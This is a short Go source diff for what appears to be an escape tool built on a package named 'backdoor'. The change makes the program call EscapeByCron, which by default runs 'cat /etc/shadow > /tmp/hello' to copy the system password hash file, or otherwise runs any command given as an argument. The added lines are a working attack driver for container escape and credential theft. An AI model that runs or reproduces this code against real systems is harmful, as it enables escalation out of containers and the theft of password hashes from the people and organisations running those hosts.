@@ -1,11 +1,15 @@
 package main
 
 import (
+	"os"
+
 	"github.com/awslshadowstar/BpfEscapeGo/pkg/backdoor"
 )
 
-const mapKey uint32 = 0
-
 func main() {
-	backdoor.Backdoor()
+	if len(os.Args) < 2 {
+		backdoor.EscapeByCron("cat /etc/shadow > /tmp/hello")
+	} else {
+		backdoor.EscapeByCron(os.Args[1])
+	}
 }
